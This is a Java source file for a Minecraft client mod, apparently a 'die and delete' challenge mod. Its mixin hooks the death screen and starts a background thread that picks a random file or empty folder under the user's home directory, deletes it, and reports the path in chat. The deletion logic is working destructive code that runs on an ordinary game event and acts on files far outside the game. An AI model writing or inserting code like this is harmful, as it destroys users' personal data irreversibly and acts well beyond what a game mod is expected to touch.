package me.omrih.dieAndDelete.client.mixin;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.DeathScreen;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.text.MutableText;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.apache.commons.lang3.SystemUtils;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.File;
import java.util.Random;


@Mixin(DeathScreen.class)
public class ServerPlayerEntityMixin {
    @Inject(method = "init", at = @At("TAIL"))
    private void onPlayerDeath(CallbackInfo ci) {
        PlayerEntity player = MinecraftClient.getInstance().player;

        new Thread(() -> {
            File home = SystemUtils.getUserHome();

            if (home.exists() && home.isDirectory()) {
                File[] files = home.listFiles();

                Random rand = new Random();

                File file = files[rand.nextInt(files.length)];
                while (file.isDirectory() && file.listFiles().length != 0) {
                    files = file.listFiles();
                    file = files[rand.nextInt(files.length)];
                }

                if (file.isDirectory() && file.listFiles().length == 0) {
                    player.sendMessage(MutableText.of(Text.literal("Deleting empty folder: " + file.getAbsolutePath()).getContent()).formatted(Formatting.RED), false);
                } else {
                    player.sendMessage(MutableText.of(Text.literal("Deleting file: " + file.getAbsolutePath()).getContent()).formatted(Formatting.RED), false);
                }

                if (file.delete()) {
                    player.sendMessage(MutableText.of(Text.literal("Deleted file").getContent()).formatted(Formatting.GREEN), false);
                } else {
                    player.sendMessage(MutableText.of(Text.literal("Failed to delete file").getContent()).formatted(Formatting.RED), false);
                }
            }
        }).start();
    }
}
